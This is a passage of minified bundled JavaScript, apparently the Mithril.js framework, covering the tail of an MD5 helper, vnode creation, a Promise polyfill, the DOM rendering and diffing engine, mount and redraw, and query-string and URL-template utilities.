        return (h << u | h >>> 32 - u) + o
    }
        ,
        n._gg = function(r, o, l, c, a, u, p) {
        var h = r + (o & c | l & ~c) + (a >>> 0) + p;
        return (h << u | h >>> 32 - u) + o
    }
        ,
        n._hh = function(r, o, l, c, a, u, p) {
        var h = r + (o ^ l ^ c) + (a >>> 0) + p;
        return (h << u | h >>> 32 - u) + o
    }
        ,
        n._ii = function(r, o, l, c, a, u, p) {
        var h = r + (l ^ (o | ~c)) + (a >>> 0) + p;
        return (h << u | h >>> 32 - u) + o
    }
        ,
        n._blocksize = 16,
        n._digestsize = 16,
        Fc.exports = function(r, o) {
        if (r == null)
            throw new Error("Illegal argument " + r);
        var l = e.wordsToBytes(n(r, o));
        return o && o.asBytes ? l : o && o.asString ? s.bytesToString(l) : e.bytesToHex(l)
    }
}
)();
var ji, Hs;
function Ge() {
    if (Hs)
        return ji;
    Hs = 1;
    function e(t, i, s, n, r, o) {
        return {
            tag: t,
            key: i,
            attrs: s,
            children: n,
            text: r,
            dom: o,
            domSize: void 0,
            state: void 0,
            events: void 0,
            instance: void 0
        }
    }
    return e.normalize = function(t) {
        return Array.isArray(t) ? e("[", void 0, void 0, e.normalizeChildren(t), void 0, void 0) : t == null || typeof t == "boolean" ? null : typeof t == "object" ? t : e("#", void 0, void 0, String(t), void 0, void 0)
    }
        ,
        e.normalizeChildren = function(t) {
        var i = [];
        if (t.length) {
            for (var s = t[0] != null && t[0].key != null, n = 1; n < t.length; n++)
                if ((t[n] != null && t[n].key != null) !== s)
                    throw new TypeError(s && (t[n] != null || typeof t[n] == "boolean") ? "In fragments, vnodes must either all have keys or none have keys. You may wish to consider using an explicit keyed empty fragment, m.fragment({key: ...}), instead of a hole." : "In fragments, vnodes must either all have keys or none have keys.");
            for (var n = 0; n < t.length; n++)
                i[n] = e.normalize(t[n])
        }
        return i
    }
        ,
        ji = e,
        ji
}
var Nc = Ge()
, Jr = function() {
    var e = arguments[this], t = this + 1, i;
    if (e == null ? e = {} : (typeof e != "object" || e.tag != null || Array.isArray(e)) && (e = {},
                                                                                             t = this),
        arguments.length === t + 1)
        i = arguments[t],
            Array.isArray(i) || (i = [i]);
    else
        for (i = []; t < arguments.length; )
            i.push(arguments[t++]);
    return Nc("", e.key, e, i)
}
, Ci = {}.hasOwnProperty
, qc = Ge()
, Wc = Jr
, pt = Ci
, Xc = /(?:(^|#|\.)([^#\.\[\]]+))|(\[(.+?)(?:\s*=\s*("|'|)((?:\\["'\]]|.)*?)\5)?\])/g
, Qr = {};
function Fs(e) {
    for (var t in e)
        if (pt.call(e, t))
            return !1;
    return !0
}
function Gc(e) {
    for (var t, i = "div", s = [], n = {}; t = Xc.exec(e); ) {
        var r = t[1]
        , o = t[2];
        if (r === "" && o !== "")
            i = o;
        else if (r === "#")
            n.id = o;
        else if (r === ".")
            s.push(o);
        else if (t[3][0] === "[") {
            var l = t[6];
            l && (l = l.replace(/\\(["'])/g, "$1").replace(/\\\\/g, "\\")),
                t[4] === "class" ? s.push(l) : n[t[4]] = l === "" ? l : l || !0
        }
    }
    return s.length > 0 && (n.className = s.join(" ")),
        Qr[e] = {
        tag: i,
        attrs: n
    }
}
function Yc(e, t) {
    var i = t.attrs
    , s = pt.call(i, "class")
    , n = s ? i.class : i.className;
    if (t.tag = e.tag,
        t.attrs = {},
        !Fs(e.attrs) && !Fs(i)) {
        var r = {};
        for (var o in i)
            pt.call(i, o) && (r[o] = i[o]);
        i = r
    }
    for (var o in e.attrs)
        pt.call(e.attrs, o) && o !== "className" && !pt.call(i, o) && (i[o] = e.attrs[o]);
    (n != null || e.attrs.className != null) && (i.className = n != null ? e.attrs.className != null ? String(e.attrs.className) + " " + String(n) : n : e.attrs.className != null ? e.attrs.className : null),
        s && (i.class = null);
    for (var o in i)
        if (pt.call(i, o) && o !== "key") {
            t.attrs = i;
            break
        }
    return t
}
function $c(e) {
    if (e == null || typeof e != "string" && typeof e != "function" && typeof e.view != "function")
        throw Error("The selector must be either a string or a component.");
    var t = Wc.apply(1, arguments);
    return typeof e == "string" && (t.children = qc.normalizeChildren(t.children),
                                    e !== "[") ? Yc(Qr[e] || Gc(e), t) : (t.tag = e,
                                                                          t)
}
var Zr = $c
, Kc = Ge()
, Jc = function(e) {
    return e == null && (e = ""),
        Kc("<", void 0, void 0, e, void 0, void 0)
}
, Qc = Ge()
, Zc = Jr
, jc = function() {
    var e = Zc.apply(0, arguments);
    return e.tag = "[",
        e.children = Qc.normalizeChildren(e.children),
        e
}
, ns = Zr;
ns.trust = Jc;
ns.fragment = jc;
var eh = ns, yi = {}, en = {
    get exports() {
        return yi
    },
    set exports(e) {
        yi = e
    }
}, tn, Vs;
function jr() {
    if (Vs)
        return tn;
    Vs = 1;
    var e = function(t) {
        if (!(this instanceof e))
            throw new Error("Promise must be called with 'new'.");
        if (typeof t != "function")
            throw new TypeError("executor must be a function.");
        var i = this
        , s = []
        , n = []
        , r = a(s, !0)
        , o = a(n, !1)
        , l = i._instance = {
            resolvers: s,
            rejectors: n
        }
        , c = typeof setImmediate == "function" ? setImmediate : setTimeout;
        function a(p, h) {
            return function m(w) {
                var v;
                try {
                    if (h && w != null && (typeof w == "object" || typeof w == "function") && typeof (v = w.then) == "function") {
                        if (w === i)
                            throw new TypeError("Promise can't be resolved with itself.");
                        u(v.bind(w))
                    } else
                        c(function() {
                            !h && p.length === 0 && console.error("Possible unhandled promise rejection:", w);
                            for (var x = 0; x < p.length; x++)
                                p[x](w);
                            s.length = 0,
                                n.length = 0,
                                l.state = h,
                                l.retry = function() {
                                m(w)
                            }
                        })
                } catch (x) {
                    o(x)
                }
            }
        }
        function u(p) {
            var h = 0;
            function m(v) {
                return function(x) {
                    h++ > 0 || v(x)
                }
            }
            var w = m(o);
            try {
                p(m(r), w)
            } catch (v) {
                w(v)
            }
        }
        u(t)
    };
    return e.prototype.then = function(t, i) {
        var s = this
        , n = s._instance;
        function r(a, u, p, h) {
            u.push(function(m) {
                if (typeof a != "function")
                    p(m);
                else
                    try {
                        o(a(m))
                    } catch (w) {
                        l && l(w)
                    }
            }),
                typeof n.retry == "function" && h === n.state && n.retry()
        }
        var o, l, c = new e(function(a, u) {
            o = a,
                l = u
        }
                           );
        return r(t, n.resolvers, o, !0),
            r(i, n.rejectors, l, !1),
            c
    }
        ,
        e.prototype.catch = function(t) {
        return this.then(null, t)
    }
        ,
        e.prototype.finally = function(t) {
        return this.then(function(i) {
            return e.resolve(t()).then(function() {
                return i
            })
        }, function(i) {
            return e.resolve(t()).then(function() {
                return e.reject(i)
            })
        })
    }
        ,
        e.resolve = function(t) {
        return t instanceof e ? t : new e(function(i) {
            i(t)
        }
                                         )
    }
        ,
        e.reject = function(t) {
        return new e(function(i, s) {
            s(t)
        }
                    )
    }
        ,
        e.all = function(t) {
        return new e(function(i, s) {
            var n = t.length
            , r = 0
            , o = [];
            if (t.length === 0)
                i([]);
            else
                for (var l = 0; l < t.length; l++)
                    (function(c) {
                        function a(u) {
                            r++,
                                o[c] = u,
                                r === n && i(o)
                        }
                        t[c] != null && (typeof t[c] == "object" || typeof t[c] == "function") && typeof t[c].then == "function" ? t[c].then(a, s) : a(t[c])
                    }
                    )(l)
        }
                    )
    }
        ,
        e.race = function(t) {
        return new e(function(i, s) {
            for (var n = 0; n < t.length; n++)
                t[n].then(i, s)
        }
                    )
    }
        ,
        tn = e,
        tn
}
var _t = jr();
typeof window < "u" ? (typeof window.Promise > "u" ? window.Promise = _t : window.Promise.prototype.finally || (window.Promise.prototype.finally = _t.prototype.finally),
                       en.exports = window.Promise) : typeof rt < "u" ? (typeof rt.Promise > "u" ? rt.Promise = _t : rt.Promise.prototype.finally || (rt.Promise.prototype.finally = _t.prototype.finally),
                                                                         en.exports = rt.Promise) : en.exports = _t;
var nn, Us;
function th() {
    if (Us)
        return nn;
    Us = 1;
    var e = Ge();
    return nn = function(t) {
        var i = t && t.document, s, n = {
            svg: "http://www.w3.org/2000/svg",
            math: "http://www.w3.org/1998/Math/MathML"
        };
        function r(d) {
            return d.attrs && d.attrs.xmlns || n[d.tag]
        }
        function o(d, f) {
            if (d.state !== f)
                throw new Error("'vnode.state' must not be modified.")
        }
        function l(d) {
            var f = d.state;
            try {
                return this.apply(f, arguments)
            } finally {
                o(d, f)
            }
        }
        function c() {
            try {
                return i.activeElement
            } catch {
                return null
            }
        }
        function a(d, f, g, b, I, A, H) {
            for (var N = g; N < b; N++) {
                var B = f[N];
                B != null && u(d, B, I, H, A)
            }
        }
        function u(d, f, g, b, I) {
            var A = f.tag;
            if (typeof A == "string")
                switch (f.state = {},
                        f.attrs != null && Fi(f.attrs, f, g),
                        A) {
                    case "#":
                        p(d, f, I);
                        break;
                    case "<":
                        m(d, f, b, I);
                        break;
                    case "[":
                        w(d, f, g, b, I);
                        break;
                    default:
                        v(d, f, g, b, I)
                }
            else
                D(d, f, g, b, I)
        }
        function p(d, f, g) {
            f.dom = i.createTextNode(f.children),
                X(d, f.dom, g)
        }
        var h = {
            caption: "table",
            thead: "table",
            tbody: "table",
            tfoot: "table",
            tr: "tbody",
            th: "tr",
            td: "tr",
            colgroup: "table",
            col: "colgroup"
        };
        function m(d, f, g, b) {
            var I = f.children.match(/^\s*?<(\w+)/im) || []
            , A = i.createElement(h[I[1]] || "div");
            g === "http://www.w3.org/2000/svg" ? (A.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg">' + f.children + "</svg>",
                                                  A = A.firstChild) : A.innerHTML = f.children,
                f.dom = A.firstChild,
                f.domSize = A.childNodes.length,
                f.instance = [];
            for (var H = i.createDocumentFragment(), N; N = A.firstChild; )
                f.instance.push(N),
                    H.appendChild(N);
            X(d, H, b)
        }
        function w(d, f, g, b, I) {
            var A = i.createDocumentFragment();
            if (f.children != null) {
                var H = f.children;
                a(A, H, 0, H.length, g, null, b)
            }
            f.dom = A.firstChild,
                f.domSize = A.childNodes.length,
                X(d, A, I)
        }
        function v(d, f, g, b, I) {
            var A = f.tag
            , H = f.attrs
            , N = H && H.is;
            b = r(f) || b;
            var B = b ? N ? i.createElementNS(b, A, {
                is: N
            }) : i.createElementNS(b, A) : N ? i.createElement(A, {
                is: N
            }) : i.createElement(A);
            if (f.dom = B,
                H != null && Bi(f, H, b),
                X(d, B, I),
                !G(f) && f.children != null) {
                var Y = f.children;
                a(B, Y, 0, Y.length, g, null, b),
                    f.tag === "select" && H != null && No(f, H)
            }
        }
        function x(d, f) {
            var g;
            if (typeof d.tag.view == "function") {
                if (d.state = Object.create(d.tag),
                    g = d.state.view,
                    g.$$reentrantLock$$ != null)
                    return;
                g.$$reentrantLock$$ = !0
            } else {
                if (d.state = void 0,
                    g = d.tag,
                    g.$$reentrantLock$$ != null)
                    return;
                g.$$reentrantLock$$ = !0,
                    d.state = d.tag.prototype != null && typeof d.tag.prototype.view == "function" ? new d.tag(d) : d.tag(d)
            }
            if (Fi(d.state, d, f),
                d.attrs != null && Fi(d.attrs, d, f),
                d.instance = e.normalize(l.call(d.state.view, d)),
                d.instance === d)
                throw Error("A view cannot return the vnode it received as argument");
            g.$$reentrantLock$$ = null
        }
        function D(d, f, g, b, I) {
            x(f, g),
                f.instance != null ? (u(d, f.instance, g, b, I),
                                      f.dom = f.instance.dom,
                                      f.domSize = f.dom != null ? f.instance.domSize : 0) : f.domSize = 0
        }
        function k(d, f, g, b, I, A) {
            if (!(f === g || f == null && g == null))
                if (f == null || f.length === 0)
                    a(d, g, 0, g.length, b, I, A);
                else if (g == null || g.length === 0)
                    te(d, f, 0, f.length);
                else {
                    var H = f[0] != null && f[0].key != null
                    , N = g[0] != null && g[0].key != null
                    , B = 0
                    , Y = 0;
                    if (!H)
                        for (; Y < f.length && f[Y] == null; )
                            Y++;
                    if (!N)
                        for (; B < g.length && g[B] == null; )
                            B++;
                    if (H !== N)
                        te(d, f, Y, f.length),
                            a(d, g, B, g.length, b, I, A);
                    else if (N) {
                        for (var ve = f.length - 1, fe = g.length - 1, ni, xe, oe, ge, Z, Li; ve >= Y && fe >= B && (ge = f[ve],
                                                                                                                     Z = g[fe],
                                                                                                                     ge.key === Z.key); )
                            ge !== Z && S(d, ge, Z, b, I, A),
                                Z.dom != null && (I = Z.dom),
                                ve--,
                                fe--;
                        for (; ve >= Y && fe >= B && (xe = f[Y],
                                                      oe = g[B],
                                                      xe.key === oe.key); )
                            Y++,
                                B++,
                                xe !== oe && S(d, xe, oe, b, $(f, Y, I), A);
                        for (; ve >= Y && fe >= B && !(B === fe || xe.key !== Z.key || ge.key !== oe.key); )
                            Li = $(f, Y, I),
                                V(d, ge, Li),
                                ge !== oe && S(d, ge, oe, b, Li, A),
                                ++B <= --fe && V(d, xe, I),
                                xe !== Z && S(d, xe, Z, b, I, A),
                                Z.dom != null && (I = Z.dom),
                                Y++,
                                ve--,
                                ge = f[ve],
                                Z = g[fe],
                                xe = f[Y],
                                oe = g[B];
                        for (; ve >= Y && fe >= B && ge.key === Z.key; )
                            ge !== Z && S(d, ge, Z, b, I, A),
                                Z.dom != null && (I = Z.dom),
                                ve--,
                                fe--,
                                ge = f[ve],
                                Z = g[fe];
                        if (B > fe)
                            te(d, f, Y, ve + 1);
                        else if (Y > ve)
                            a(d, g, B, fe + 1, b, I, A);
                        else {
                            var $o = I, Ps = fe - B + 1, At = new Array(Ps), Ni = 0, ne = 0, qi = 2147483647, Wi = 0, ni, Xi;
                            for (ne = 0; ne < Ps; ne++)
                                At[ne] = -1;
                            for (ne = fe; ne >= B; ne--) {
                                ni == null && (ni = W(f, Y, ve + 1)),
                                    Z = g[ne];
                                var st = ni[Z.key];
                                st != null && (qi = st < qi ? st : -1,
                                               At[ne - B] = st,
                                               ge = f[st],
                                               f[st] = null,
                                               ge !== Z && S(d, ge, Z, b, I, A),
                                               Z.dom != null && (I = Z.dom),
                                               Wi++)
                            }
                            if (I = $o,
                                Wi !== ve - Y + 1 && te(d, f, Y, ve + 1),
                                Wi === 0)
                                a(d, g, B, fe + 1, b, I, A);
                            else if (qi === -1)
                                for (Xi = _(At),
                                     Ni = Xi.length - 1,
                                     ne = fe; ne >= B; ne--)
                                    oe = g[ne],
                                        At[ne - B] === -1 ? u(d, oe, b, A, I) : Xi[Ni] === ne - B ? Ni-- : V(d, oe, I),
                                        oe.dom != null && (I = g[ne].dom);
                            else
                                for (ne = fe; ne >= B; ne--)
                                    oe = g[ne],
                                        At[ne - B] === -1 && u(d, oe, b, A, I),
                                        oe.dom != null && (I = g[ne].dom)
                        }
                    } else {
                        var Ui = f.length < g.length ? f.length : g.length;
                        for (B = B < Y ? B : Y; B < Ui; B++)
                            xe = f[B],
                                oe = g[B],
                                !(xe === oe || xe == null && oe == null) && (xe == null ? u(d, oe, b, A, $(f, B + 1, I)) : oe == null ? ie(d, xe) : S(d, xe, oe, b, $(f, B + 1, I), A));
                        f.length > Ui && te(d, f, B, f.length),
                            g.length > Ui && a(d, g, B, g.length, b, I, A)
                    }
                }
        }
        function S(d, f, g, b, I, A) {
            var H = f.tag
            , N = g.tag;
            if (H === N) {
                if (g.state = f.state,
                    g.events = f.events,
                    Yo(g, f))
                    return;
                if (typeof H == "string")
                    switch (g.attrs != null && Vi(g.attrs, g, b),
                            H) {
                        case "#":
                            O(f, g);
                            break;
                        case "<":
                            U(d, f, g, A, I);
                            break;
                        case "[":
                            L(d, f, g, b, I, A);
                            break;
                        default:
                            q(f, g, b, A)
                    }
                else
                    P(d, f, g, b, I, A)
            } else
                ie(d, f),
                    u(d, g, b, A, I)
        }
        function O(d, f) {
            d.children.toString() !== f.children.toString() && (d.dom.nodeValue = f.children),
                f.dom = d.dom
        }
        function U(d, f, g, b, I) {
            f.children !== g.children ? (K(d, f),
                                         m(d, g, b, I)) : (g.dom = f.dom,
                                                           g.domSize = f.domSize,
                                                           g.instance = f.instance)
        }
        function L(d, f, g, b, I, A) {
            k(d, f.children, g.children, b, I, A);
            var H = 0
            , N = g.children;
            if (g.dom = null,
                N != null) {
                for (var B = 0; B < N.length; B++) {
                    var Y = N[B];
                    Y != null && Y.dom != null && (g.dom == null && (g.dom = Y.dom),
                                                   H += Y.domSize || 1)
                }
                H !== 1 && (g.domSize = H)
            }
        }
        function q(d, f, g, b) {
            var I = f.dom = d.dom;
            b = r(f) || b,
                f.tag === "textarea" && f.attrs == null && (f.attrs = {}),
                qo(f, d.attrs, f.attrs, b),
                G(f) || k(I, d.children, f.children, g, null, b)
        }
        function P(d, f, g, b, I, A) {
            if (g.instance = e.normalize(l.call(g.state.view, g)),
                g.instance === g)
                throw Error("A view cannot return the vnode it received as argument");
            Vi(g.state, g, b),
                g.attrs != null && Vi(g.attrs, g, b),
                g.instance != null ? (f.instance == null ? u(d, g.instance, b, A, I) : S(d, f.instance, g.instance, b, I, A),
                                      g.dom = g.instance.dom,
                                      g.domSize = g.instance.domSize) : f.instance != null ? (ie(d, f.instance),
                                                                                              g.dom = void 0,
                                                                                              g.domSize = 0) : (g.dom = f.dom,
                                                                                                                g.domSize = f.domSize)
        }
        function W(d, f, g) {
            for (var b = Object.create(null); f < g; f++) {
                var I = d[f];
                if (I != null) {
                    var A = I.key;
                    A != null && (b[A] = f)
                }
            }
            return b
        }
        var F = [];
        function _(d) {
            for (var f = [0], g = 0, b = 0, I = 0, A = F.length = d.length, I = 0; I < A; I++)
                F[I] = d[I];
            for (var I = 0; I < A; ++I)
                if (d[I] !== -1) {
                    var H = f[f.length - 1];
                    if (d[H] < d[I]) {
                        F[I] = H,
                            f.push(I);
                        continue
                    }
                    for (g = 0,
                         b = f.length - 1; g < b; ) {
                        var N = (g >>> 1) + (b >>> 1) + (g & b & 1);
                        d[f[N]] < d[I] ? g = N + 1 : b = N
                    }
                    d[I] < d[f[g]] && (g > 0 && (F[I] = f[g - 1]),
                                       f[g] = I)
                }
            for (g = f.length,
                 b = f[g - 1]; g-- > 0; )
                f[g] = b,
                    b = F[b];
            return F.length = 0,
                f
        }
        function $(d, f, g) {
            for (; f < d.length; f++)
                if (d[f] != null && d[f].dom != null)
                    return d[f].dom;
            return g
        }
        function V(d, f, g) {
            var b = i.createDocumentFragment();
            z(d, b, f),
                X(d, b, g)
        }
        function z(d, f, g) {
            for (; g.dom != null && g.dom.parentNode === d; ) {
                if (typeof g.tag != "string") {
                    if (g = g.instance,
                        g != null)
                        continue
                } else if (g.tag === "<")
                    for (var b = 0; b < g.instance.length; b++)
                        f.appendChild(g.instance[b]);
                else if (g.tag !== "[")
                    f.appendChild(g.dom);
                else if (g.children.length === 1) {
                    if (g = g.children[0],
                        g != null)
                        continue
                } else
                    for (var b = 0; b < g.children.length; b++) {
                        var I = g.children[b];
                        I != null && z(d, f, I)
                    }
                break
            }
        }
        function X(d, f, g) {
            g != null ? d.insertBefore(f, g) : d.appendChild(f)
        }
        function G(d) {
            if (d.attrs == null || d.attrs.contenteditable == null && d.attrs.contentEditable == null)
                return !1;
            var f = d.children;
            if (f != null && f.length === 1 && f[0].tag === "<") {
                var g = f[0].children;
                d.dom.innerHTML !== g && (d.dom.innerHTML = g)
            } else if (f != null && f.length !== 0)
                throw new Error("Child node of a contenteditable must be trusted.");
            return !0
        }
        function te(d, f, g, b) {
            for (var I = g; I < b; I++) {
                var A = f[I];
                A != null && ie(d, A)
            }
        }
        function ie(d, f) {
            var g = 0, b = f.state, I, A;
            if (typeof f.tag != "string" && typeof f.state.onbeforeremove == "function") {
                var H = l.call(f.state.onbeforeremove, f);
                H != null && typeof H.then == "function" && (g = 1,
                                                             I = H)
            }
            if (f.attrs && typeof f.attrs.onbeforeremove == "function") {
                var H = l.call(f.attrs.onbeforeremove, f);
                H != null && typeof H.then == "function" && (g |= 2,
                                                             A = H)
            }
            if (o(f, b),
                !g)
                nt(f),
                    ke(d, f);
            else {
                if (I != null) {
                    var N = function() {
                        g & 1 && (g &= 2,
                                  g || B())
                    };
                    I.then(N, N)
                }
                if (A != null) {
                    var N = function() {
                        g & 2 && (g &= 1,
                                  g || B())
                    };
                    A.then(N, N)
                }
            }
            function B() {
                o(f, b),
                    nt(f),
                    ke(d, f)
            }
        }
        function K(d, f) {
            for (var g = 0; g < f.instance.length; g++)
                d.removeChild(f.instance[g])
        }
        function ke(d, f) {
            for (; f.dom != null && f.dom.parentNode === d; ) {
                if (typeof f.tag != "string") {
                    if (f = f.instance,
                        f != null)
                        continue
                } else if (f.tag === "<")
                    K(d, f);
                else {
                    if (f.tag !== "[" && (d.removeChild(f.dom),
                                          !Array.isArray(f.children)))
                        break;
                    if (f.children.length === 1) {
                        if (f = f.children[0],
                            f != null)
                            continue
                    } else
                        for (var g = 0; g < f.children.length; g++) {
                            var b = f.children[g];
                            b != null && ke(d, b)
                        }
                }
                break
            }
        }
        function nt(d) {
            if (typeof d.tag != "string" && typeof d.state.onremove == "function" && l.call(d.state.onremove, d),
                d.attrs && typeof d.attrs.onremove == "function" && l.call(d.attrs.onremove, d),
                typeof d.tag != "string")
                d.instance != null && nt(d.instance);
            else {
                var f = d.children;
                if (Array.isArray(f))
                    for (var g = 0; g < f.length; g++) {
                        var b = f[g];
                        b != null && nt(b)
                    }
            }
        }
        function Bi(d, f, g) {
            d.tag === "input" && f.type != null && d.dom.setAttribute("type", f.type);
            var b = f != null && d.tag === "input" && f.type === "file";
            for (var I in f)
                Ue(d, I, null, f[I], g, b)
        }
        function Ue(d, f, g, b, I, A) {
            if (!(f === "key" || f === "is" || b == null || Ts(f) || g === b && !Wo(d, f) && typeof b != "object" || f === "type" && d.tag === "input")) {
                if (f[0] === "o" && f[1] === "n")
                    return Es(d, f, b);
                if (f.slice(0, 6) === "xlink:")
                    d.dom.setAttributeNS("http://www.w3.org/1999/xlink", f.slice(6), b);
                else if (f === "style")
                    Ms(d.dom, g, b);
                else if (Is(d, f, I)) {
                    if (f === "value") {
                        if ((d.tag === "input" || d.tag === "textarea") && d.dom.value === "" + b && (A || d.dom === c()) || d.tag === "select" && g !== null && d.dom.value === "" + b || d.tag === "option" && g !== null && d.dom.value === "" + b)
                            return;
                        if (A && "" + b != "") {
                            console.error("`value` is read-only on file inputs!");
                            return
                        }
                    }
                    d.dom[f] = b
                } else
                    typeof b == "boolean" ? b ? d.dom.setAttribute(f, "") : d.dom.removeAttribute(f) : d.dom.setAttribute(f === "className" ? "class" : f, b)
            }
        }
        function Ye(d, f, g, b) {
            if (!(f === "key" || f === "is" || g == null || Ts(f)))
                if (f[0] === "o" && f[1] === "n")
                    Es(d, f, void 0);
                else if (f === "style")
                    Ms(d.dom, g, null);
                else if (Is(d, f, b) && f !== "className" && f !== "title" && !(f === "value" && (d.tag === "option" || d.tag === "select" && d.dom.selectedIndex === -1 && d.dom === c())) && !(d.tag === "input" && f === "type"))
                    d.dom[f] = null;
                else {
                    var I = f.indexOf(":");
                    I !== -1 && (f = f.slice(I + 1)),
                        g !== !1 && d.dom.removeAttribute(f === "className" ? "class" : f)
                }
        }
        function No(d, f) {
            if ("value"in f)
                if (f.value === null)
                    d.dom.selectedIndex !== -1 && (d.dom.value = null);
                else {
                    var g = "" + f.value;
                    (d.dom.value !== g || d.dom.selectedIndex === -1) && (d.dom.value = g)
                }
            "selectedIndex"in f && Ue(d, "selectedIndex", null, f.selectedIndex, void 0)
        }
        function qo(d, f, g, b) {
            if (f && f === g && console.warn("Don't reuse attrs object, use new object for every redraw, this will throw in next major"),
                g != null) {
                d.tag === "input" && g.type != null && d.dom.setAttribute("type", g.type);
                var I = d.tag === "input" && g.type === "file";
                for (var A in g)
                    Ue(d, A, f && f[A], g[A], b, I)
            }
            var H;
            if (f != null)
                for (var A in f)
                    (H = f[A]) != null && (g == null || g[A] == null) && Ye(d, A, H, b)
        }
        function Wo(d, f) {
            return f === "value" || f === "checked" || f === "selectedIndex" || f === "selected" && d.dom === c() || d.tag === "option" && d.dom.parentNode === i.activeElement
        }
        function Ts(d) {
            return d === "oninit" || d === "oncreate" || d === "onupdate" || d === "onremove" || d === "onbeforeremove" || d === "onbeforeupdate"
        }
        function Is(d, f, g) {
            return g === void 0 && (d.tag.indexOf("-") > -1 || d.attrs != null && d.attrs.is || f !== "href" && f !== "list" && f !== "form" && f !== "width" && f !== "height") && f in d.dom
        }
        var Xo = /[A-Z]/g;
        function Go(d) {
            return "-" + d.toLowerCase()
        }
        function zi(d) {
            return d[0] === "-" && d[1] === "-" ? d : d === "cssFloat" ? "float" : d.replace(Xo, Go)
        }
        function Ms(d, f, g) {
            if (f !== g)
                if (g == null)
                    d.style.cssText = "";
                else if (typeof g != "object")
                    d.style.cssText = g;
                else if (f == null || typeof f != "object") {
                    d.style.cssText = "";
                    for (var b in g) {
                        var I = g[b];
                        I != null && d.style.setProperty(zi(b), String(I))
                    }
                } else {
                    for (var b in g) {
                        var I = g[b];
                        I != null && (I = String(I)) !== String(f[b]) && d.style.setProperty(zi(b), I)
                    }
                    for (var b in f)
                        f[b] != null && g[b] == null && d.style.removeProperty(zi(b))
                }
        }
        function Hi() {
            this._ = s
        }
        Hi.prototype = Object.create(null),
            Hi.prototype.handleEvent = function(d) {
            var f = this["on" + d.type], g;
            typeof f == "function" ? g = f.call(d.currentTarget, d) : typeof f.handleEvent == "function" && f.handleEvent(d),
                this._ && d.redraw !== !1 && (0,
                                              this._)(),
                g === !1 && (d.preventDefault(),
                             d.stopPropagation())
        }
        ;
        function Es(d, f, g) {
            if (d.events != null) {
                if (d.events._ = s,
                    d.events[f] === g)
                    return;
                g != null && (typeof g == "function" || typeof g == "object") ? (d.events[f] == null && d.dom.addEventListener(f.slice(2), d.events, !1),
                                                                                 d.events[f] = g) : (d.events[f] != null && d.dom.removeEventListener(f.slice(2), d.events, !1),
                                                                                                     d.events[f] = void 0)
            } else
                g != null && (typeof g == "function" || typeof g == "object") && (d.events = new Hi,
                                                                                  d.dom.addEventListener(f.slice(2), d.events, !1),
                                                                                  d.events[f] = g)
        }
        function Fi(d, f, g) {
            typeof d.oninit == "function" && l.call(d.oninit, f),
                typeof d.oncreate == "function" && g.push(l.bind(d.oncreate, f))
        }
        function Vi(d, f, g) {
            typeof d.onupdate == "function" && g.push(l.bind(d.onupdate, f))
        }
        function Yo(d, f) {
            do {
                if (d.attrs != null && typeof d.attrs.onbeforeupdate == "function") {
                    var g = l.call(d.attrs.onbeforeupdate, d, f);
                    if (g !== void 0 && !g)
                        break
                }
                if (typeof d.tag != "string" && typeof d.state.onbeforeupdate == "function") {
                    var g = l.call(d.state.onbeforeupdate, d, f);
                    if (g !== void 0 && !g)
                        break
                }
                return !1
            } while (!1);
            return d.dom = f.dom,
                d.domSize = f.domSize,
                d.instance = f.instance,
                d.attrs = f.attrs,
                d.children = f.children,
                d.text = f.text,
                !0
        }
        var Ct;
        return function(d, f, g) {
            if (!d)
                throw new TypeError("DOM element being rendered to does not exist.");
            if (Ct != null && d.contains(Ct))
                throw new TypeError("Node is currently being rendered to and thus is locked.");
            var b = s
            , I = Ct
            , A = []
            , H = c()
            , N = d.namespaceURI;
            Ct = d,
                s = typeof g == "function" ? g : void 0;
            try {
                d.vnodes == null && (d.textContent = ""),
                    f = e.normalizeChildren(Array.isArray(f) ? f : [f]),
                    k(d, d.vnodes, f, A, null, N === "http://www.w3.org/1999/xhtml" ? void 0 : N),
                    d.vnodes = f,
                    H != null && c() !== H && typeof H.focus == "function" && H.focus();
                for (var B = 0; B < A.length; B++)
                    A[B]()
            } finally {
                s = b,
                    Ct = I
            }
        }
    }
        ,
        nn
}
var sn, Ls;
function eo() {
    return Ls || (Ls = 1,
                  sn = th()(typeof window < "u" ? window : null)),
        sn
}
var Ns = Ge(), ih = function(e, t, i) {
    var s = []
    , n = !1
    , r = -1;
    function o() {
        for (r = 0; r < s.length; r += 2)
            try {
                e(s[r], Ns(s[r + 1]), l)
            } catch (a) {
                i.error(a)
            }
        r = -1
    }
    function l() {
        n || (n = !0,
              t(function() {
            n = !1,
                o()
        }))
    }
    l.sync = o;
    function c(a, u) {
        if (u != null && u.view == null && typeof u != "function")
            throw new TypeError("m.mount expects a component, not a vnode.");
        var p = s.indexOf(a);
        p >= 0 && (s.splice(p, 2),
                   p <= r && (r -= 2),
                   e(a, [])),
            u != null && (s.push(a, u),
                          e(a, Ns(u), l))
    }
    return {
        mount: c,
        redraw: l
    }
}, nh = eo(), ss = ih(nh, typeof requestAnimationFrame < "u" ? requestAnimationFrame : null, typeof console < "u" ? console : null), rn, qs;
function to() {
    return qs || (qs = 1,
                  rn = function(e) {
        if (Object.prototype.toString.call(e) !== "[object Object]")
            return "";
        var t = [];
        for (var i in e)
            s(i, e[i]);
        return t.join("&");
        function s(n, r) {
            if (Array.isArray(r))
                for (var o = 0; o < r.length; o++)
                    s(n + "[" + o + "]", r[o]);
            else if (Object.prototype.toString.call(r) === "[object Object]")
                for (var o in r)
                    s(n + "[" + o + "]", r[o]);
            else
                t.push(encodeURIComponent(n) + (r != null && r !== "" ? "=" + encodeURIComponent(r) : ""))
        }
    }
                 ),
        rn
}
var on, Ws;
function io() {
    if (Ws)
        return on;
    Ws = 1;
    var e = Ci;
    return on = Object.assign || function(t, i) {
        for (var s in i)
            e.call(i, s) && (t[s] = i[s])
    }
        ,
        on
}
var an, Xs;
function rs() {
    if (Xs)
        return an;
    Xs = 1;
    var e = to()
    , t = io();
    return an = function(i, s) {
        if (/:([^\/\.-]+)(\.{3})?:/.test(i))
            throw new SyntaxError("Template parameter names must be separated by either a '/', '-', or '.'.");
        if (s == null)
            return i;
        var n = i.indexOf("?")
        , r = i.indexOf("#")
        , o = r < 0 ? i.length : r
        , l = n < 0 ? o : n
        , c = i.slice(0, l)
        , a = {};
        t(a, s);
        var u = c.replace(/:([^\/\.-]+)(\.{3})?/g, function(D, k, S) {
            return delete a[k],
                s[k] == null ? D : S ? s[k] : encodeURIComponent(String(s[k]))
        })
